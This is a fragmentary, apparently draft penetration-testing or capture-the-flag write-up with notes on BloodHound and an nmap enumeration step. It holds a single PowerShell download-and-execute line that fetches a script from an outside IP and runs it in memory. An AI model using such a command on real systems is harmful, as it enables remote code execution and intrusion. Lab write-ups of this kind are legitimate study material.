...
### Notes
- re-make and add the neccesary information about launch bloodhound to see the information
# Enumeration
We launch nmap
...
`powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.45/file.ps1')`
